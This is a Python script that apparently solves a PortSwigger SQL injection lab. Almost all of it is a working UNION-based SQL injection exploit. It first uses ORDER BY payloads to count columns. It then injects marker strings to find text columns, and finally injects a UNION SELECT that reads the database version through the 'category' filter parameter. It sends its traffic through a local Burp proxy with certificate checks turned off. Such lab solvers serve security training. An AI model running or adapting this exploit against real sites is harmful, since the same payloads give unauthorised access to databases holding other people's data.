#!/usr/bin/env python3
import sys
import warnings
from typing import List, Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

REQUEST_TIMEOUT = (2, 5)
FILTER_ENDPOINT = "filter"
FILTER_CATEGORY = ""
MAX_COL_TO_TEST = 10
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.timeout = (2, 5)

    def send_request(
        self, endpoint: str, params: Optional[dict] = None, method: str = "GET"
    ) -> Optional[requests.Response]:
        url = urljoin(self.base_url, endpoint)

        try:
            return self.session.request(
                method=method,
                url=url,
                params=params,
                timeout=self.timeout,
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except requests.RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

    def is_alive(self) -> bool:
        """Checks if the lab URL is alive"""
        print("[*] Phase 1: Checking if URL is alive...")
        res = self.send_request("")

        if res is not None and res.status_code == 200:
            if "academyLabHeader" in res.text:
                return True

        return False

    def harvest_category(self) -> Optional[str]:
        """Dynamically identifies a valid category to anchor injection."""
        print("[*] Phase 2: Harvesting valid filter categories...")
        res = self.send_request("")
        if not res:
            return None

        soup = BeautifulSoup(res.text, "html.parser")
        categories = []

        for tag in soup.find_all("a", class_="filter-category"):
            name = tag.get_text(strip=True)
            if "All" not in name:
                categories.append(name)

        return min(categories, key=len) if categories else None

    def find_column_count(self, category: str) -> int:
        print("[*] Phase 3: Determining column count...")

        for i in range(1, 11):
            payload = f"{category}' ORDER BY {i} -- "
            res = self.send_request("filter", params={"category": payload})
            if res is not None and res.status_code != 200:
                return i - 1
        return 0

    def find_string_column(self, category: str, col_count: int) -> List[int]:
        print("[*] Phase 4: Mapping string-compatible columns...")
        str_indices = []
        marker = "asif"
        for i in range(col_count):
            cols = ["NULL"] * col_count
            cols[i] = f"'{marker}'"
            paylaod = f"{category}' UNION SELECT {','.join(cols)} -- "
            res = self.send_request("filter", params={"category": paylaod})
            if res and marker in res.text:
                str_indices.append(i)
        return str_indices

    def solve(self):
        # Check if Lab URL is stil active
        if not self.is_alive():
            print("[-] The PortSwigger Lab URL is not reachable or has expired!")
            return

        # Extract categories
        category = self.harvest_category()
        if not category:
            print("[-] Could not find a valid category.")
            return
        print(f"[+] Target category identified: {category}.")

        # Determine column count
        col_count = self.find_column_count(category)
        if col_count == 0:
            return
        print(f"[+] Column count: {col_count}.")

        # Map string-compatible column
        col_indices = self.find_string_column(category, col_count)
        if not col_indices:
            return

        print("[*] Phase 5: Extracting Database Version...")
        cols = ["NULL"] * col_count
        cols[col_indices[0]] = "@@version"
        payload = f"{category}' UNION SELECT {','.join(cols)} -- "
        self.send_request("filter", params={"category": payload})

        print("[*] Phase 6: Verifying lab status...")
        res = self.send_request("")

        if res and "Congratulation" in res.text:
            print("[!] SUCCESS: Lab solved and verfied via session state.")
        else:
            print("[-] Lab failed!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)
    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
